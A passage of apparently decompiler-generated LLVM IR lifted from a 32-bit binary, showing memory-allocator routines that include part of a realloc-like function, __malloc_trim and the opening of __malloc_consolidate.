  store i32 %v3_8050ab8, i32* %eax.global-to-local, align 4
  %v1_8050abb = load i32, i32* @edx, align 4
  %v2_8050abb = add i32 %v1_8050abb, 4
  %v3_8050abb = inttoptr i32 %v2_8050abb to i32*
  store i32 %v3_8050ab8, i32* %v3_8050abb, align 4
  %v0_8050abe = load i32, i32* @esi, align 4
  %v1_8050abe = add i32 %v0_8050abe, 8
  %v2_8050abe = inttoptr i32 %v1_8050abe to i32*
  %v3_8050abe = load i32, i32* %v2_8050abe, align 4
  store i32 %v3_8050abe, i32* %eax.global-to-local, align 4
  %v1_8050ac1 = load i32, i32* @edx, align 4
  %v2_8050ac1 = add i32 %v1_8050ac1, 8
  %v3_8050ac1 = inttoptr i32 %v2_8050ac1 to i32*
  store i32 %v3_8050abe, i32* %v3_8050ac1, align 4
  %tmp24 = icmp ult i32 %v1_8050a8f, 17
  br i1 %tmp24, label %dec_label_pc_8050af4, label %dec_label_pc_8050ac6

dec_label_pc_8050ac6:                             ; preds = %dec_label_pc_8050aad
  %v0_8050ac6 = load i32, i32* @esi, align 4
  %v1_8050ac6 = add i32 %v0_8050ac6, 12
  %v2_8050ac6 = inttoptr i32 %v1_8050ac6 to i32*
  %v3_8050ac6 = load i32, i32* %v2_8050ac6, align 4
  store i32 %v3_8050ac6, i32* %eax.global-to-local, align 4
  %v0_8050ac9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050acc = load i32, i32* @edx, align 4
  %v2_8050acc = add i32 %v1_8050acc, 12
  %v3_8050acc = inttoptr i32 %v2_8050acc to i32*
  store i32 %v3_8050ac6, i32* %v3_8050acc, align 4
  %v0_8050acf = load i32, i32* @esi, align 4
  %v1_8050acf = add i32 %v0_8050acf, 16
  %v2_8050acf = inttoptr i32 %v1_8050acf to i32*
  %v3_8050acf = load i32, i32* %v2_8050acf, align 4
  store i32 %v3_8050acf, i32* %eax.global-to-local, align 4
  %v1_8050ad2 = load i32, i32* @edx, align 4
  %v2_8050ad2 = add i32 %v1_8050ad2, 16
  %v3_8050ad2 = inttoptr i32 %v2_8050ad2 to i32*
  store i32 %v3_8050acf, i32* %v3_8050ad2, align 4
  %tmp25 = icmp ult i32 %v0_8050ac9, 7
  br i1 %tmp25, label %dec_label_pc_8050af4, label %dec_label_pc_8050ad7

dec_label_pc_8050ad7:                             ; preds = %dec_label_pc_8050ac6
  %v0_8050ad7 = load i32, i32* @esi, align 4
  %v1_8050ad7 = add i32 %v0_8050ad7, 20
  %v2_8050ad7 = inttoptr i32 %v1_8050ad7 to i32*
  %v3_8050ad7 = load i32, i32* %v2_8050ad7, align 4
  store i32 %v3_8050ad7, i32* %eax.global-to-local, align 4
  %v0_8050ada = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050add = load i32, i32* @edx, align 4
  %v2_8050add = add i32 %v1_8050add, 20
  %v3_8050add = inttoptr i32 %v2_8050add to i32*
  store i32 %v3_8050ad7, i32* %v3_8050add, align 4
  %v0_8050ae0 = load i32, i32* @esi, align 4
  %v1_8050ae0 = add i32 %v0_8050ae0, 24
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i32*
  %v3_8050ae0 = load i32, i32* %v2_8050ae0, align 4
  store i32 %v3_8050ae0, i32* %eax.global-to-local, align 4
  %v1_8050ae3 = load i32, i32* @edx, align 4
  %v2_8050ae3 = add i32 %v1_8050ae3, 24
  %v3_8050ae3 = inttoptr i32 %v2_8050ae3 to i32*
  store i32 %v3_8050ae0, i32* %v3_8050ae3, align 4
  %tmp26 = icmp ult i32 %v0_8050ada, 9
  br i1 %tmp26, label %dec_label_pc_8050af4, label %dec_label_pc_8050ae8

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050ad7
  %v0_8050ae8 = load i32, i32* @esi, align 4
  %v1_8050ae8 = add i32 %v0_8050ae8, 28
  %v2_8050ae8 = inttoptr i32 %v1_8050ae8 to i32*
  %v3_8050ae8 = load i32, i32* %v2_8050ae8, align 4
  store i32 %v3_8050ae8, i32* %eax.global-to-local, align 4
  %v1_8050aeb = load i32, i32* @edx, align 4
  %v2_8050aeb = add i32 %v1_8050aeb, 28
  %v3_8050aeb = inttoptr i32 %v2_8050aeb to i32*
  store i32 %v3_8050ae8, i32* %v3_8050aeb, align 4
  %v0_8050aee = load i32, i32* @esi, align 4
  %v1_8050aee = add i32 %v0_8050aee, 32
  %v2_8050aee = inttoptr i32 %v1_8050aee to i32*
  %v3_8050aee = load i32, i32* %v2_8050aee, align 4
  store i32 %v3_8050aee, i32* %eax.global-to-local, align 4
  %v1_8050af1 = load i32, i32* @edx, align 4
  %v2_8050af1 = add i32 %v1_8050af1, 32
  %v3_8050af1 = inttoptr i32 %v2_8050af1 to i32*
  store i32 %v3_8050aee, i32* %v3_8050af1, align 4
  br label %dec_label_pc_8050af4

dec_label_pc_8050af4:                             ; preds = %dec_label_pc_8050ad7, %dec_label_pc_8050ac6, %dec_label_pc_8050aad, %dec_label_pc_8050a9c, %dec_label_pc_8050ae8
  %v0_8050af7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050af7 = add i32 %v0_8050af7, 8
  store i32 %v1_8050af7, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050afe = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050c32

dec_label_pc_8050b08:                             ; preds = %dec_label_pc_80509c9, %dec_label_pc_8050a7f, %dec_label_pc_8050a4d
  %v1_8050b19 = phi i32 [ %v1_80509b9, %dec_label_pc_80509c9 ], [ %v2_8050a86, %dec_label_pc_8050a7f ], [ %v0_8050b08.pre, %dec_label_pc_8050a4d ]
  %v5_8050b0a = sub i32 %v1_8050b19, %stack_var_-40.0
  store i32 %v5_8050b0a, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_8050b0a, 16
  br i1 %tmp27, label %dec_label_pc_8050b13, label %dec_label_pc_8050b25

dec_label_pc_8050b13:                             ; preds = %dec_label_pc_8050b08
  %v0_8050b13 = load i32, i32* @edi, align 4
  %v1_8050b13 = add i32 %v0_8050b13, 4
  %v2_8050b13 = inttoptr i32 %v1_8050b13 to i32*
  %v3_8050b13 = load i32, i32* %v2_8050b13, align 4
  %v1_8050b16 = urem i32 %v3_8050b13, 2
  %v2_8050b19 = or i32 %v1_8050b16, %v1_8050b19
  store i32 %v2_8050b19, i32* %eax.global-to-local, align 4
  store i32 %v2_8050b19, i32* %v2_8050b13, align 4
  %v0_8050b1e = load i32, i32* @edi, align 4
  %v1_8050b1e = load i32, i32* @ebx, align 4
  %v2_8050b1e = add i32 %v0_8050b1e, 4
  %v3_8050b1e = add i32 %v2_8050b1e, %v1_8050b1e
  %v4_8050b1e = inttoptr i32 %v3_8050b1e to i32*
  %v5_8050b1e = load i32, i32* %v4_8050b1e, align 4
  %v6_8050b1e = or i32 %v5_8050b1e, 1
  store i32 %v6_8050b1e, i32* %v4_8050b1e, align 4
  br label %dec_label_pc_8050b55

dec_label_pc_8050b25:                             ; preds = %dec_label_pc_8050b08
  %v0_8050b29 = load i32, i32* @edi, align 4
  %v2_8050b29 = add i32 %v0_8050b29, %stack_var_-40.0
  store i32 %v2_8050b29, i32* %eax.global-to-local, align 4
  %v1_8050b2c = add i32 %v0_8050b29, 4
  %v2_8050b2c = inttoptr i32 %v1_8050b2c to i32*
  %v3_8050b2c = load i32, i32* %v2_8050b2c, align 4
  %v1_8050b2f = urem i32 %v3_8050b2c, 2
  %v5_8050b32 = or i32 %v1_8050b2f, %stack_var_-40.0
  store i32 %v5_8050b32, i32* %v2_8050b2c, align 4
  %v0_8050b3c = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b3e = or i32 %v0_8050b3c, 1
  store i32 %v1_8050b3e, i32* @edx, align 4
  %v1_8050b41 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b41 = add i32 %v1_8050b41, 4
  %v3_8050b41 = inttoptr i32 %v2_8050b41 to i32*
  store i32 %v1_8050b3e, i32* %v3_8050b41, align 4
  %v0_8050b44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b44 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050b44 = add i32 %v0_8050b44, 4
  %v3_8050b44 = add i32 %v2_8050b44, %v1_8050b44
  %v4_8050b44 = inttoptr i32 %v3_8050b44 to i32*
  %v5_8050b44 = load i32, i32* %v4_8050b44, align 4
  %v6_8050b44 = or i32 %v5_8050b44, 1
  store i32 %v6_8050b44, i32* %v4_8050b44, align 4
  %v0_8050b49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b49 = add i32 %v0_8050b49, 8
  store i32 %v1_8050b49, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b49, i32* %stack_var_-60, align 4
  %v1_8050b4d = call i32 @free(i32 %v1_8050b49)
  store i32 %v1_8050b4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b55

dec_label_pc_8050b55:                             ; preds = %dec_label_pc_8050b13, %dec_label_pc_8050b25
  %v0_8050b55 = load i32, i32* @edi, align 4
  %v1_8050b55 = add i32 %v0_8050b55, 8
  store i32 %v1_8050b55, i32* @ebx, align 4
  br label %dec_label_pc_8050c3f

dec_label_pc_8050b5d:                             ; preds = %dec_label_pc_80509ad
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_8050b61 = load i32, i32* @global_var_805eb3c.184, align 4
  store i32 %v0_8050b61, i32* %eax.global-to-local, align 4
  %v2_8050b6a = inttoptr i32 %v1_80509b1 to i32*
  %v3_8050b6a = load i32, i32* %v2_8050b6a, align 4
  store i32 %v3_8050b6a, i32* @ebp, align 4
  %v1_8050b6d = add i32 %v0_8050b61, -1
  %v1_8050b6e = or i32 %stack_var_-40.0, 4
  store i32 %v1_8050b6e, i32* %stack_var_-44, align 4
  %v2_8050b74 = add i32 %v1_8050b6d, %v3_8050b6a
  store i32 %v2_8050b74, i32* @edx, align 4
  %v1_8050b77 = sub i32 0, %v0_8050b61
  store i32 %v1_8050b77, i32* %eax.global-to-local, align 4
  %v2_8050b79 = add i32 %v2_8050b74, %v1_8050b6e
  %v2_8050b7c = and i32 %v2_8050b79, %v1_8050b77
  store i32 %v2_8050b7c, i32* @esi, align 4
  %v2_8050b80 = sub i32 %v2_8050b7c, %v3_8050b6a
  store i32 %v2_8050b80, i32* @ebx, align 4
  %v15_8050b82 = icmp eq i32 %v1_80509b9, %v2_8050b80
  br i1 %v15_8050b82, label %dec_label_pc_8050c3b, label %dec_label_pc_8050b8c

dec_label_pc_8050b8c:                             ; preds = %dec_label_pc_8050b5d
  %v2_8050b8e = sub i32 %v1_80509b1, %v3_8050b6a
  store i32 %v2_8050b8e, i32* @edi, align 4
  %v2_8050b95 = add i32 %v3_8050b6a, %v1_80509b9
  store i32 %v2_8050b95, i32* %eax.global-to-local, align 4
  store i32 %v2_8050b8e, i32* %stack_var_-60, align 4
  %v6_8050b99 = call i32 @mremap(i32 %v2_8050b8e, i32 %v2_8050b95, i32 %v2_8050b7c, i32 1, i32 %v1_8050b6e, i32 %v1_80509b9)
  store i32 %v6_8050b99, i32* %eax.global-to-local, align 4
  %v10_8050ba1 = icmp eq i32 %v6_8050b99, -1
  br i1 %v10_8050ba1, label %dec_label_pc_8050bf3, label %dec_label_pc_8050ba6

dec_label_pc_8050ba6:                             ; preds = %dec_label_pc_8050b8c
  %v1_8050ba6 = load i32, i32* @ebp, align 4
  %v2_8050ba6 = add i32 %v1_8050ba6, %v6_8050b99
  store i32 %v2_8050ba6, i32* %eax.global-to-local, align 4
  %v0_8050ba8 = load i32, i32* @ebx, align 4
  %v1_8050ba8 = or i32 %v0_8050ba8, 2
  %v2_8050bab = add i32 %v2_8050ba6, 4
  %v3_8050bab = inttoptr i32 %v2_8050bab to i32*
  store i32 %v1_8050ba8, i32* %v3_8050bab, align 4
  %v0_8050bae = load i32, i32* @esi, align 4
  %v5_8050bb0 = sub i32 %v0_8050bae, %v1_80509b9
  %v0_8050bb4 = load i32, i32* @global_var_805eb50.188, align 16
  %v0_8050bba = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bba = add i32 %v0_8050bba, 8
  store i32 %v1_8050bba, i32* @ebx, align 4
  %v1_8050bbd = load i32, i32* @global_var_805eb44.190, align 4
  %v2_8050bbd = add i32 %v1_8050bbd, %v5_8050bb0
  store i32 %v2_8050bbd, i32* @global_var_805eb44.190, align 4
  %tmp20 = icmp ule i32 %v2_8050bbd, %v0_8050bb4
  %v5_8050bcf = select i1 %tmp20, i32 %v0_8050bb4, i32 %v2_8050bbd
  store i32 %v5_8050bcf, i32* %ecx.global-to-local, align 4
  %v1_8050bd2 = load i32, i32* @global_var_805eb48.191, align 8
  %v2_8050bd2 = add i32 %v1_8050bd2, %v2_8050bbd
  store i32 %v5_8050bcf, i32* @global_var_805eb50.188, align 16
  %v1_8050bde = load i32, i32* @global_var_805eb54.192, align 4
  %tmp28 = icmp ule i32 %v2_8050bd2, %v1_8050bde
  %v5_8050be4 = select i1 %tmp28, i32 %v1_8050bde, i32 %v2_8050bd2
  store i32 %v5_8050be4, i32* @edx, align 4
  store i32 %v5_8050be4, i32* @global_var_805eb54.192, align 4
  br label %dec_label_pc_8050c3f

dec_label_pc_8050bf3:                             ; preds = %dec_label_pc_8050b8c
  %v2_8050bf3 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050bf3, i32* %eax.global-to-local, align 4
  %v10_8050bf6 = icmp ult i32 %v1_80509b9, %v2_8050bf3
  %v1_8050bfa = icmp eq i1 %v10_8050bf6, false
  br i1 %v1_8050bfa, label %dec_label_pc_8050c3b, label %dec_label_pc_8050bfc

dec_label_pc_8050bfc:                             ; preds = %dec_label_pc_8050bf3
  %v1_8050c03 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050c03, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c03, i32* %stack_var_-60, align 4
  %v1_8050c07 = call i32 @malloc(i32 %v1_8050c03)
  store i32 %v1_8050c07, i32* %eax.global-to-local, align 4
  %v1_8050c0f = icmp eq i32 %v1_8050c07, 0
  store i32 %v1_8050c07, i32* @ebx, align 4
  br i1 %v1_8050c0f, label %dec_label_pc_8050c37, label %dec_label_pc_8050c15

dec_label_pc_8050c15:                             ; preds = %dec_label_pc_8050bfc
  %v1_8050c1a = add i32 %v1_80509b9, -8
  store i32 %v1_8050c1a, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c07, i32* %stack_var_-60, align 4
  %v3_8050c23 = inttoptr i32 %v1_8050c07 to i16*
  %v4_8050c23 = call i32 @memcpy(i16* %v3_8050c23, i32 %tmp8, i32 %v1_8050c1a)
  store i32 %v4_8050c23, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c07, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050c2d = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050c32

dec_label_pc_8050c32:                             ; preds = %dec_label_pc_8050af4, %dec_label_pc_8050c15
  %storemerge = phi i32 [ %v1_8050c2d, %dec_label_pc_8050c15 ], [ %v1_8050afe, %dec_label_pc_8050af4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c3f

dec_label_pc_8050c37:                             ; preds = %dec_label_pc_8050bfc, %dec_label_pc_8050a58
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050c3f

dec_label_pc_8050c3b:                             ; preds = %dec_label_pc_8050bf3, %dec_label_pc_8050b5d, %dec_label_pc_80509f7
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8050c3f

dec_label_pc_8050c3f:                             ; preds = %dec_label_pc_8050c37, %dec_label_pc_8050c32, %dec_label_pc_8050ba6, %dec_label_pc_8050b55, %dec_label_pc_8050c3b
  store i32 %v2_8050966, i32* @eax, align 4
  store i32 %v2_8050966, i32* %stack_var_-60, align 4
  %v2_8050c48 = call i32 @__pthread_return_void(i32 %v2_8050966, i32 1)
  store i32 %v2_8050c48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4d

dec_label_pc_8050c4d:                             ; preds = %dec_label_pc_805094a, %dec_label_pc_8050936, %dec_label_pc_8050c3f
  br label %dec_label_pc_8050c50

dec_label_pc_8050c50:                             ; preds = %dec_label_pc_8050984, %dec_label_pc_8050c4d
  %v0_8050c53 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c53, i32* %eax.global-to-local, align 4
  store i32 %v0_8050927, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050926, i32* @esi, align 4
  ret i32 %v0_8050c53

; uselistorder directives
  uselistorder i32 %v1_8050c07, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8050bde, { 1, 0 }
  uselistorder i32 %v2_8050bd2, { 1, 0 }
  uselistorder i32 %v2_8050bbd, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8050bb4, { 1, 0 }
  uselistorder i32 %v6_8050b99, { 1, 0, 2 }
  uselistorder i32 %v2_8050b8e, { 1, 0, 2 }
  uselistorder i32 %v1_8050b6e, { 2, 0, 1 }
  uselistorder i32 %v3_8050b6a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050b29, { 1, 0 }
  uselistorder i32 %v1_8050a8f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050a63, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_8050a07, { 1, 0, 2 }
  uselistorder i32 %v3_8050a1a, { 0, 2, 1 }
  uselistorder i32 %v2_80509d7, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80509b9, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_80509b1, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_80509a6, { 1, 0 }
  uselistorder i32 %v1_8050996, { 1, 2, 0 }
  uselistorder i32 %v0_805097f, { 1, 0 }
  uselistorder i32 %v2_8050966, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c50, { 1, 0 }
  uselistorder label %dec_label_pc_8050c4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050c3f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050c32, { 1, 0 }
  uselistorder label %dec_label_pc_8050b55, { 1, 0 }
  uselistorder label %dec_label_pc_8050b08, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050af4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050a4d, { 1, 0 }
  uselistorder label %dec_label_pc_80509ad, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8050c5d = load i32, i32* @edx, align 4
  store i32 %v0_8050c5d, i32* %ebp.global-to-local, align 4
  %v0_8050c60 = load i32, i32* @esi, align 4
  %v1_8050c65 = add i32 %v0_8050c5d, 860
  %v2_8050c65 = inttoptr i32 %v1_8050c65 to i32*
  %v3_8050c65 = load i32, i32* %v2_8050c65, align 4
  store i32 %v3_8050c65, i32* @ecx, align 4
  %v1_8050c6b = add i32 %v0_8050c5d, 44
  %v2_8050c6b = inttoptr i32 %v1_8050c6b to i32*
  %v3_8050c6b = load i32, i32* %v2_8050c6b, align 4
  %v1_8050c6e = add i32 %v3_8050c6b, 4
  %v2_8050c6e = inttoptr i32 %v1_8050c6e to i32*
  %v3_8050c6e = load i32, i32* %v2_8050c6e, align 4
  %v1_8050c71 = and i32 %v3_8050c6e, -4
  store i32 %v1_8050c71, i32* @esi, align 4
  %v1_8050c76 = load i32, i32* @eax, align 4
  %v2_8050c76 = add i32 %v3_8050c65, -17
  %v2_8050c78 = add i32 %v2_8050c76, %v1_8050c71
  %v3_8050c78 = sub i32 %v2_8050c78, %v1_8050c76
  %div = udiv i32 %v3_8050c78, %v3_8050c65
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050c78, %v3_8050c65
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050c80 = add i32 %div, -1
  %v4_8050c83 = mul i32 %v1_8050c80, %v3_8050c65
  store i32 %v4_8050c83, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050c83, 1
  br i1 %tmp11, label %dec_label_pc_8050cdf, label %dec_label_pc_8050c8a

dec_label_pc_8050c8a:                             ; preds = %entry
  %v1_8050c8f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050c8f, i32* %edi.global-to-local, align 4
  %v0_8050c99 = load i32, i32* @esi, align 4
  store i32 %v0_8050c99, i32* %eax.global-to-local, align 4
  %v1_8050c9b = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050c9b = add i32 %v1_8050c9b, 44
  %v3_8050c9b = inttoptr i32 %v2_8050c9b to i32*
  %v4_8050c9b = load i32, i32* %v3_8050c9b, align 4
  %v5_8050c9b = add i32 %v4_8050c9b, %v0_8050c99
  store i32 %v5_8050c9b, i32* %eax.global-to-local, align 4
  %v12_8050c9e = icmp eq i32 %v1_8050c8f, %v5_8050c9b
  %v1_8050ca0 = icmp eq i1 %v12_8050c9e, false
  br i1 %v1_8050ca0, label %dec_label_pc_8050cdf, label %dec_label_pc_8050ca2

dec_label_pc_8050ca2:                             ; preds = %dec_label_pc_8050c8a
  %v1_8050ca5 = sub i32 0, %v4_8050c83
  store i32 %v1_8050ca5, i32* @ebx, align 4
  %v1_8050ca8 = call i32 @__GI_sbrk(i32 %v1_8050ca5)
  store i32 %v1_8050ca8, i32* %eax.global-to-local, align 4
  %v1_8050cb4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050cb4, i32* %eax.global-to-local, align 4
  %v10_8050cbc = icmp eq i32 %v1_8050cb4, -1
  br i1 %v10_8050cbc, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cc1

dec_label_pc_8050cc1:                             ; preds = %dec_label_pc_8050ca2
  %v0_8050cc1 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050cc3 = sub i32 %v0_8050cc1, %v1_8050cb4
  %v12_8050cc3 = icmp eq i32 %v2_8050cc3, 0
  store i32 %v2_8050cc3, i32* @ecx, align 4
  br i1 %v12_8050cc3, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cc7

dec_label_pc_8050cc7:                             ; preds = %dec_label_pc_8050cc1
  %v0_8050cc7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050cc7 = add i32 %v0_8050cc7, 44
  %v2_8050cc7 = inttoptr i32 %v1_8050cc7 to i32*
  %v3_8050cc7 = load i32, i32* %v2_8050cc7, align 4
  store i32 %v3_8050cc7, i32* %eax.global-to-local, align 4
  %v0_8050cca = load i32, i32* @esi, align 4
  %v2_8050cca = sub i32 %v0_8050cca, %v2_8050cc3
  store i32 %v2_8050cca, i32* %esi.global-to-local, align 4
  %v1_8050ccc = add i32 %v0_8050cc7, 872
  %v2_8050ccc = inttoptr i32 %v1_8050ccc to i32*
  %v3_8050ccc = load i32, i32* %v2_8050ccc, align 4
  %v5_8050ccc = sub i32 %v3_8050ccc, %v2_8050cc3
  store i32 %v5_8050ccc, i32* %v2_8050ccc, align 4
  %v0_8050cd2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050cd2 = or i32 %v0_8050cd2, 1
  store i32 %v1_8050cd2, i32* %esi.global-to-local, align 4
  %v1_8050cd5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cd5 = add i32 %v1_8050cd5, 4
  %v3_8050cd5 = inttoptr i32 %v2_8050cd5 to i32*
  store i32 %v1_8050cd2, i32* %v3_8050cd5, align 4
  br label %dec_label_pc_8050ce1

dec_label_pc_8050cdf:                             ; preds = %dec_label_pc_8050cc1, %dec_label_pc_8050ca2, %dec_label_pc_8050c8a, %entry
  br label %dec_label_pc_8050ce1

dec_label_pc_8050ce1:                             ; preds = %dec_label_pc_8050cc7, %dec_label_pc_8050cdf
  %storemerge = phi i32 [ 1, %dec_label_pc_8050cc7 ], [ 0, %dec_label_pc_8050cdf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050c60, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050cb4, { 1, 0, 2 }
  uselistorder i32 %v4_8050c83, { 1, 2, 0 }
  uselistorder i32 %v3_8050c65, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8050c5d, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ce1, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8050cea = load i32, i32* @edi, align 4
  %v0_8050ceb = load i32, i32* @esi, align 4
  %v0_8050cec = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8050cf4 = load i32, i32* %arg1, align 4
  store i32 %v2_8050cf4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050cfb = icmp eq i32 %v2_8050cf4, 0
  br i1 %v1_8050cfb, label %dec_label_pc_8050e24.preheader, label %dec_label_pc_8050d03

dec_label_pc_8050e24.preheader:                   ; preds = %entry
  %v3_8050e19 = add i32 %tmp11, 44
  br label %dec_label_pc_8050e15

dec_label_pc_8050d03:                             ; preds = %entry
  %v1_8050d07 = and i32 %v2_8050cf4, -3
  store i32 %v1_8050d07, i32* %arg1, align 4
  %v1_8050d0c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8050d1b = add i32 %tmp11, 4
  store i32 %v1_8050d1b, i32* %eax.global-to-local, align 4
  %v2_8050d22 = load i32, i32* %arg1, align 4
  %v2_8050d28 = udiv i32 %v2_8050d22, 8
  %v2_8050d2b = mul nuw i32 %v2_8050d28, 4
  %v3_8050d2b = add i32 %tmp11, -4
  %v4_8050d2b = add i32 %v3_8050d2b, %v2_8050d2b
  store i32 %v4_8050d2b, i32* %eax.global-to-local, align 4
  %v2_8050df2 = add i32 %tmp11, 44
  %v3_8050df2 = inttoptr i32 %v2_8050df2 to i32*
  %v1_8050dc5 = add i32 %tmp11, 60
  %v2_8050dc5 = inttoptr i32 %v1_8050dc5 to i32*
  br label %dec_label_pc_8050d33

dec_label_pc_8050d33:                             ; preds = %dec_label_pc_8050e0b, %dec_label_pc_8050d03
  %v0_8050d41 = phi i32 [ %v1_8050d1b, %dec_label_pc_8050d03 ], [ %v4_8050e0b, %dec_label_pc_8050e0b ]
  store i32 %v0_8050d41, i32* %eax.global-to-local, align 4
  %v1_8050d37 = inttoptr i32 %v0_8050d41 to i32*
  %v2_8050d37 = load i32, i32* %v1_8050d37, align 4
  store i32 %v2_8050d37, i32* @ecx, align 4
  %v1_8050d39 = icmp eq i32 %v2_8050d37, 0
  br i1 %v1_8050d39, label %dec_label_pc_8050e01, label %dec_label_pc_8050d41

dec_label_pc_8050d41:                             ; preds = %dec_label_pc_8050d33
  store i32 0, i32* %v1_8050d37, align 4
  %v0_8050d47.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050d47

dec_label_pc_8050d47:                             ; preds = %dec_label_pc_8050df5, %dec_label_pc_8050d41
  %v0_8050d64 = phi i32 [ %v3_8050d47, %dec_label_pc_8050df5 ], [ %v0_8050d47.pre, %dec_label_pc_8050d41 ]
  %v1_8050d47 = add i32 %v0_8050d64, 8
  %v2_8050d47 = inttoptr i32 %v1_8050d47 to i32*
  %v3_8050d47 = load i32, i32* %v2_8050d47, align 4
  store i32 %v3_8050d47, i32* %edx.global-to-local, align 4
  %v1_8050d4e = add i32 %v0_8050d64, 4
  %v2_8050d4e = inttoptr i32 %v1_8050d4e to i32*
  %v3_8050d4e = load i32, i32* %v2_8050d4e, align 4
  store i32 %v3_8050d4e, i32* %eax.global-to-local, align 4
  %v1_8050d53 = and i32 %v3_8050d4e, -2
  store i32 %v1_8050d53, i32* @edi, align 4
  %v2_8050d56 = urem i32 %v3_8050d4e, 2
  %v3_8050d56 = icmp eq i32 %v2_8050d56, 0
  %v2_8050d58 = add i32 %v1_8050d53, %v0_8050d64
  store i32 %v2_8050d58, i32* @ebx, align 4
  %v1_8050d5b = add i32 %v2_8050d58, 4
  %v2_8050d5b = inttoptr i32 %v1_8050d5b to i32*
  %v3_8050d5b = load i32, i32* %v2_8050d5b, align 4
  store i32 %v3_8050d5b, i32* %edx.global-to-local, align 4
  %v1_8050d62 = icmp eq i1 %v3_8050d56, false
